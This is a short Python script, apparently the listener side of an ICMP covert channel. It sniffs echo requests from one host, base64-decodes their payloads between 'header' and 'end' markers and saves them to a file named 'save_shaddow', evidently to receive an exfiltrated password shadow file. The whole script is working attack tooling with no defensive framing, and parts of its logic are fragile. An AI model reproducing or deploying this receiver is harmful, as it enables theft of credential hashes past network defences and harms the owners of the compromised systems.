from scapy import all as scapy
import base64


def sniffing():
    capture = scapy.sniff(filter="icmp and icmp[0]=8 and host 192.168.43.165", prn=lambda x: x.show())
    a = 0
    b = False
    while capture[a]:
        paquet = capture[a]
        raw = str(paquet.lastlayer())
        if raw == "header":
            b = True
        if raw == "end":
            exit()
        if b:
            if raw == "header":
                a += 1
            else:
                a += 1
                text_file = open("save_shaddow", "a")
                sans_hash = raw.replace("hash", "")
                decode = base64.b64decode(sans_hash)
                text_file.write(decode)
                text_file.close()
        else:
            a += 1


# cat save_shaddow | tr -d '\r' > save_shaddow3
# mv save_shaddow3 save_shaddow

sniffing()
